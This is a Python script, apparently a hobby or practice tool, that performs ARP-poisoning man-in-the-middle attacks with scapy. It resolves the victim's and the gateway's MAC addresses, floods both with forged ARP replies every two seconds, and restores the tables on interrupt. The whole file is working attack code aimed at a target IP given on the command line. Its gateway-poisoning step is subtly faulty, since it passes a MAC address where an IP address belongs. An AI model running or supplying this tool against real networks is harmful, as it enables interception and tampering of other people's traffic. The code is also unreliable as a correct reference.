import os
from scapy.all import Ether, ARP, srp, send
import netifaces as ni
import time
from threading import Thread
import argparse



class MITM(object):

    def __init__(self, interface, victim_ip):
        self.interface = interface
        self.victim_ip = victim_ip
        self.victim_mac = None
        #create new thread

    def arp_poison(self):
        self.victim_mac = self._get_mac_address(self.victim_ip)
        self.gateway_ip = self._get_gateway_ip()
        self.gateway_mac = self._get_mac_address(self.gateway_ip)

        print(f'victim mac at : {self.victim_mac}')
        print(f'gate_way mac at : {self.gateway_mac}')
        print(f'attacker mac at : a4:83:e7:c5:44:92')
        try:
            while True:
                self._victim_poison(self.victim_ip, self.victim_mac, self.gateway_ip)
                self._gateway_poison(self.gateway_ip, self.gateway_mac, self.victim_mac)
                time.sleep(2)
        except KeyboardInterrupt:
            self._restore_network(self.gateway_ip, self.gateway_mac, self.victim_ip, self.victim_mac)

    def _restore_network(self, gateway_ip, gateway_mac, victim_ip, victim_mac):
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=victim_mac, psrc=victim_ip), count=5, iface=self.interface)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=victim_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5, iface=self.interface)


    def _get_mac_address(self, ip):
        arpbroadcast= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip)
        received = srp(arpbroadcast,  timeout=3)
        return received[0][0][1].hwsrc


    def _victim_poison(self, victim_ip, victim_mac, gateway_ip):
        send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip), iface=self.interface)
   

    def _gateway_poison(self, gateway_ip, gateway_mac, victim_mac):
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_mac), iface=self.interface)

    def _get_attacker_ip(self):
        ip = ni.ifaddresses(self.interface)[ni.AF_INET][0]['addr']
        return ip

    def _get_gateway_ip(self):
        gwd = ni.gateways()
        return list(gwd['default'].values())[0][0]


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='MITM')
    parser.add_argument("--interface", required=True, type=str, help="Network Interface")
    parser.add_argument("--ip", required=True, type=str, help="Target's IP")

    args = parser.parse_args()
    mitm = MITM(args.interface, args.ip)
    mitm.arp_poison()
